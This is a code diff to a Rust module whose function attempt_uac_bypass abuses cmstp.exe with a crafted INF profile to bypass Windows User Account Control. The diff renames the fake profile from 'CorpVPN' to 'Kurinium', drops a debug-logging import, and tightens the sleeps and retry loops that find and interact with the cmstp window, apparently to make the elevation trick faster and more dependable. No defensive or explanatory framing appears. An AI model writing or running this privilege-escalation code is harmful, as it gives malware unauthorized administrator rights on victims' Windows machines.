@@ -35,11 +35,9 @@ taskkill /IM cmstp.exe /F
 "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
 
 [Strings]
-ServiceName="CorpVPN"
-ShortSvcName="CorpVPN"
+ServiceName="Kurinium"
+ShortSvcName="Kurinium"
 "#;
-
-use crate::log_debug;
 
 pub fn attempt_uac_bypass() -> bool {
     let exe_path = match env::current_exe() {
@@ -82,9 +80,9 @@ pub fn attempt_uac_bypass() -> bool {
         }
     };
 
-    thread::sleep(Duration::from_millis(1000));
+    thread::sleep(Duration::from_millis(200));
 
-    let window_titles = ["CorpVPN", "cmstp"];
+    let window_titles = ["Kurinium", "cmstp"];
     let mut interacted = false;
 
     for title in &window_titles {
@@ -110,7 +108,7 @@ fn interact_with_window(window_title: &str) -> bool {
         Err(_) => return false,
     };
 
-    for _ in 0..30 {
+    for _ in 0..100 {
         unsafe {
             let hwnd = FindWindowA(null_mut(), class_name.as_ptr());
             if !hwnd.is_null() {
@@ -129,7 +127,7 @@ fn interact_with_window(window_title: &str) -> bool {
                 return true;
             }
         }
-        thread::sleep(Duration::from_millis(100));
+        thread::sleep(Duration::from_millis(20));
     }
 
     false
